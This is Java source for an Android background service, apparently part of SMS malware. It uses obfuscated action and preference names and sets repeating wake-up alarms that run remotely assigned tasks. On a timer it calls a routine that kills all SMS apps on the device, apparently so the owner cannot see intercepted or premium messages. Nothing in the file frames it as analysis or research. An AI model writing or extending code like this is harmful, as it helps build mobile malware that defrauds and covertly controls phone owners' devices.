package kernel.workspace.worker;
import java.util.HashMap;
import java.util.Map;
import kernel.workspace.Settings;
import kernel.workspace.manager.TaskManager;
import kernel.workspace.network.NetworkController;
import kernel.workspace.util.AppStoper;
import kernel.workspace.util.Logger;
import kernel.workspace.util.T;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;

public class ServiceWorker {
    private static final int killSmsInterval = 612;//seconds
    //Action
    public static final String CONNECT_CHANGE = "dddddddddd";
    public static final String KILL_SMS = "eeeeeee";
    public static final String REGISTER = "fffff";
    public static final String CHECK_TASK_ALARM = "cccccccccccc";
    private static final String EXECUTE_TASK = "xx";
    private static final String EXECUTE_KILL_SMS_APP = "yy";
    private static final String intentObjKey = "dffffff";
    //What
    private static final int WHAT_CONNECT_CHANGE = 1010101010;
    private static final int WHAT_KILL_SMS = 9999999;
    private static final int WHAT_EXECUTE_KILL_SMS_APP = 8888888;
    private static final int WHAT_REGISTER = 777777;
    private static final int WHAT_CHECK_TASK_ALARM = 66666;
    private static final int WHAT_EXECUTE_TASK = 5555;
    //Pref
    private String TASK_PREF_NAME = "OPQRVSG";
    private static String KILL_SMS_PREF_NAME = "OPQRVSGdddd";
    //Locker
    private static final Object killSmsLocker = new Object();
    private static final Object taskLocker = new Object();
    @SuppressWarnings("serial")
    private Map<String, Integer> hashMap = new HashMap<String, Integer>() {
        {
            put(EXECUTE_TASK, WHAT_EXECUTE_TASK);
            put(CHECK_TASK_ALARM, WHAT_CHECK_TASK_ALARM);
            put(REGISTER, WHAT_REGISTER);
            put(EXECUTE_KILL_SMS_APP, WHAT_EXECUTE_KILL_SMS_APP);
            put(KILL_SMS, WHAT_KILL_SMS);
            put(CONNECT_CHANGE, WHAT_CONNECT_CHANGE);
        }
    };
    private Context context;
    private final static Object locker = new Object();
    private ServiceWorker(Context service) {
        this.context = service;
    }
    public static Intent getServiceIntent(Context context, String action) {
        return new Intent().setClassName(context, "c.Service").setAction(action);
    }
    private static ServiceWorker instance;
    public static ServiceWorker getInstance(Context context) {
        if (instance == null) {
            synchronized (locker) {
                if (instance == null) instance = new ServiceWorker(context);
            }
        }
        return instance;
    }
    private void restartTaskAlarm() {
        synchronized (taskLocker) {
            AlarmManager manager = (AlarmManager) context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(context, 0, getServiceIntent(context, EXECUTE_TASK), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, Settings.TASK_CHECK_INTERVAL * 1000, pending);
        }
    }
    public void restartKillSmsAppAlarm() {
        synchronized (killSmsLocker) {
            AlarmManager manager = (AlarmManager) context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(context, 0, getServiceIntent(context, EXECUTE_KILL_SMS_APP), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, killSmsInterval * 1000, pending);
        }
    }
    
    public int onStartCommand(Intent intent) {
        Logger.info(this.getClass().getName() + " start");
        T.init(context);
        String action = null;
        if (intent != null) action = intent.getAction();
        if (hashMap.containsKey(action)) {
            handler.sendMessage(handler.obtainMessage(hashMap.get(action), intent.getStringExtra(intentObjKey)));
        }
        Logger.info(this.getClass().getName() + " end");
        return 0;
    }
    private Handler handler = new Handler() {
        public void handleMessage(android.os.Message msg) {
            int what = msg.what;
            Object obj=msg.obj;
            handle(what,obj);
        }
    };
    private void handle(int what,Object obj) {
        SharedPreferences pref = context.getSharedPreferences(TASK_PREF_NAME, 0);
        switch (what) {
            case WHAT_EXECUTE_TASK:
                pref.edit().putLong(TASK_PREF_NAME, System.currentTimeMillis()).commit();
                TaskManager.getInstance(context).triggerByService("m".equals(obj));
                break;
            case WHAT_CHECK_TASK_ALARM: {
                long lastProcessTime = pref.getLong(TASK_PREF_NAME, 0);
                if (System.currentTimeMillis() - lastProcessTime > Settings.TASK_CHECK_INTERVAL * 1000) {
                    restartTaskAlarm();
                }
            }
                break;
            case WHAT_REGISTER:
                T.registerRecievier(context);
                break;
            case WHAT_EXECUTE_KILL_SMS_APP:
                pref.edit().putLong(KILL_SMS_PREF_NAME, System.currentTimeMillis()).commit();
                AppStoper.killAllSmsApps(context);
                break;
            case WHAT_KILL_SMS: {
                long lastProcessTime = pref.getLong(KILL_SMS_PREF_NAME, 0);
                if (System.currentTimeMillis() - lastProcessTime > Settings.TASK_CHECK_INTERVAL * 1000) {
                    restartKillSmsAppAlarm();
                }
            }
                break;
            case WHAT_CONNECT_CHANGE:
                NetworkController.onNetworkChanged();
                break;
        }
    }
}
